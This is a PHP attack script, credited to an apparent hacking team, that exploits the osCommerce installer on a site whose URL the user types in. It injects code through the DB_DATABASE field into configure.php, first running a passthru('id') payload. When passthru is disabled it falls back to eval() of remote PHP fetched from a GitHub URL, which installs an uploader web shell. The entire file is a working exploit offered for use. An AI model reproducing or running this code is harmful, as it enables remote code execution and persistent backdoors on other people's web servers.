<?php
# N4ST4R_ID
# D704T Hengker Team

function request($url, $postdata = null) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	if($postdata == true) {
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
	}
	curl_setopt($ch, CURLOPT_TIMEOUT, 10);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$xx = curl_exec($ch);
	$info = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);
	return ["head" => $info, "body" => $xx];
}

$data = ["DIR_FS_DOCUMENT_ROOT" => "./"];
$payload = "');passthru(\"id\");/*";
$payload2 = "');eval(\"?>\".file_get_contents(\"https://raw.githubusercontent.com/nastar-id/kegabutan/master/nastar.php\"));/*";

echo "[!] Enter target => ";
$url = trim(fgets(STDIN));
$target = $url."/catalog/install/install.php?step=4";
$shell = $url."/catalog/install/includes/configure.php";
$install = request($target);

if($install["head"] == 200 && preg_match("/Installation/", $install["body"])) {
	echo "[*] ".$url."\n";
	echo "[+] Installation page ok\n";
	$data["DB_DATABASE"] = $payload;
	$inject = request($target, $data);
	$shelk = request($shell);
	if($shelk["head"] == 200 && preg_match("/gid/", $shelk["body"])) {
		echo "[+] Shell success!\n";
		echo "[+] ".$shell."\n\n";
	} elseif($shelk["head"] == 200 && preg_match("/disabled/", $shelk["body"])) {
		  echo "[-] RCE shell failed! target has disabled passthru function\n";
		  echo "[*] Trying to inject uploader code\n";
		  $data["DB_DATABASE"] = $payload2;
		  $bypass = request($target, $data);
		  $shelk = request($shell);
		  if(preg_match("/Uploader/", $shelk["body"])) {
		    echo "[+] Uploader success!\n";
		    echo "[+] ".$shell."\n";
		  } else {
		    echo "[-] Uploader failed\n";
		  }
	} else {
	  echo "[-] configure.php error!\n";
	}
} else {
	echo "[*] ".$url."\n";
	echo "[-] Installation page can't be accessed\n\n";
}

?>
